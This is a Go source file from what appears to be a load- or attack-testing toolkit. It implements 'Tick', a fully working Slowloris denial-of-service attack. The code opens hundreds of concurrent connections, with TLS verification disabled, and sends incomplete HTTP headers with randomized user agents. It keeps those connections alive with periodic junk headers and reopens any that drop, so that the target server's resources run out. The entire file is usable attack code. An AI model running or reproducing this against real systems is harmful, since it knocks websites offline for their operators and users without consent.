package sting

import (
	"bufio"
	"context"
	"crypto/tls"
	"fmt"
	"net"
	"net/url"
	"sync"
	"sync/atomic"
	"time"

	"vivarium/internal/common"
)

// Tick implements a Slowloris attack.
// It opens many connections and sends partial headers slowly to exhaust server resources.
type Tick struct{}

// NewTick creates a new Tick attack instance.
func NewTick() *Tick {
	return &Tick{}
}

// Name returns the attack name.
func (t *Tick) Name() string {
	return "Tick"
}

// Description returns a brief description.
func (t *Tick) Description() string {
	return "Slowloris - latches on slowly, drains over time"
}

// Attack executes the Tick Slowloris attack.
func (t *Tick) Attack(ctx context.Context, target string, opts AttackOpts) (*Result, error) {
	if opts.Sockets <= 0 {
		opts.Sockets = 200
	}
	if opts.Delay <= 0 {
		opts.Delay = 15 * time.Second
	}

	// Parse target URL
	parsedURL, err := url.Parse(target)
	if err != nil {
		return nil, fmt.Errorf("invalid target URL: %w", err)
	}

	host := parsedURL.Host
	if parsedURL.Port() == "" {
		if parsedURL.Scheme == "https" {
			host += ":443"
		} else {
			host += ":80"
		}
	}

	useTLS := parsedURL.Scheme == "https"
	path := parsedURL.Path
	if path == "" {
		path = "/"
	}

	var (
		opened  atomic.Int64
		alive   atomic.Int64
		dropped atomic.Int64
	)

	start := time.Now()

	// Track active connections
	type connInfo struct {
		conn   net.Conn
		writer *bufio.Writer
	}
	connections := make([]*connInfo, 0, opts.Sockets)
	var connMu sync.Mutex

	// Create initial connections
	fmt.Printf("   Opening %d connections...\n", opts.Sockets)

	var wg sync.WaitGroup
	connChan := make(chan *connInfo, opts.Sockets)

	// Open connections concurrently
	for i := 0; i < opts.Sockets; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()

			select {
			case <-ctx.Done():
				return
			default:
			}

			conn, err := t.openConnection(host, useTLS)
			if err != nil {
				dropped.Add(1)
				return
			}

			// Send initial partial headers
			writer := bufio.NewWriter(conn)
			err = t.sendInitialHeaders(writer, parsedURL.Host, path)
			if err != nil {
				conn.Close()
				dropped.Add(1)
				return
			}

			opened.Add(1)
			alive.Add(1)
			connChan <- &connInfo{conn: conn, writer: writer}
		}()
	}

	// Collect connections
	go func() {
		wg.Wait()
		close(connChan)
	}()

	for ci := range connChan {
		connMu.Lock()
		connections = append(connections, ci)
		connMu.Unlock()
	}

	fmt.Printf("   Opened %d connections, keeping them alive...\n", opened.Load())
	fmt.Println("   Press Ctrl+C to stop")

	// Keep connections alive by sending partial headers
	ticker := time.NewTicker(opts.Delay)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			// Close all connections
			connMu.Lock()
			for _, ci := range connections {
				ci.conn.Close()
			}
			connMu.Unlock()

			return &Result{
				TotalRequests: int(opened.Load()),
				Successful:    int(alive.Load()),
				Failed:        int(dropped.Load()),
				Duration:      time.Since(start),
			}, nil

		case <-ticker.C:
			connMu.Lock()
			stillAlive := 0
			newConnections := make([]*connInfo, 0, len(connections))

			for _, ci := range connections {
				// Send keep-alive header
				err := t.sendKeepAlive(ci.writer)
				if err != nil {
					ci.conn.Close()
					alive.Add(-1)
					dropped.Add(1)
				} else {
					stillAlive++
					newConnections = append(newConnections, ci)
				}
			}

			connections = newConnections
			connMu.Unlock()

			if opts.Verbose {
				fmt.Printf("\r   Alive: %d | Dropped: %d | Duration: %s",
					stillAlive, dropped.Load(), time.Since(start).Round(time.Second))
			}

			// Try to reopen dropped connections
			if stillAlive < opts.Sockets {
				toOpen := opts.Sockets - stillAlive
				if toOpen > 50 {
					toOpen = 50 // Don't open too many at once
				}

				for i := 0; i < toOpen; i++ {
					go func() {
						conn, err := t.openConnection(host, useTLS)
						if err != nil {
							return
						}

						writer := bufio.NewWriter(conn)
						err = t.sendInitialHeaders(writer, parsedURL.Host, path)
						if err != nil {
							conn.Close()
							return
						}

						opened.Add(1)
						alive.Add(1)

						connMu.Lock()
						connections = append(connections, &connInfo{conn: conn, writer: writer})
						connMu.Unlock()
					}()
				}
			}
		}
	}
}

// openConnection opens a TCP connection to the target.
func (t *Tick) openConnection(host string, useTLS bool) (net.Conn, error) {
	dialer := &net.Dialer{
		Timeout:   10 * time.Second,
		KeepAlive: 30 * time.Second,
	}

	if useTLS {
		return tls.DialWithDialer(dialer, "tcp", host, &tls.Config{
			InsecureSkipVerify: true,
		})
	}

	return dialer.Dial("tcp", host)
}

// sendInitialHeaders sends the initial partial HTTP headers.
func (t *Tick) sendInitialHeaders(writer *bufio.Writer, host, path string) error {
	// Send a partial HTTP request - missing the final \r\n
	headers := fmt.Sprintf("GET %s HTTP/1.1\r\n", path)
	headers += fmt.Sprintf("Host: %s\r\n", host)
	headers += fmt.Sprintf("User-Agent: %s\r\n", common.RandomUserAgent())
	headers += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
	headers += "Accept-Language: en-US,en;q=0.5\r\n"
	headers += "Connection: keep-alive\r\n"
	// Don't send the final \r\n - this keeps the request "partial"

	_, err := writer.WriteString(headers)
	if err != nil {
		return err
	}
	return writer.Flush()
}

// sendKeepAlive sends a keep-alive header to prevent timeout.
func (t *Tick) sendKeepAlive(writer *bufio.Writer) error {
	// Send another header to keep the connection open
	_, err := writer.WriteString(fmt.Sprintf("X-Tick-%d: %d\r\n", time.Now().UnixNano(), time.Now().Unix()))
	if err != nil {
		return err
	}
	return writer.Flush()
}
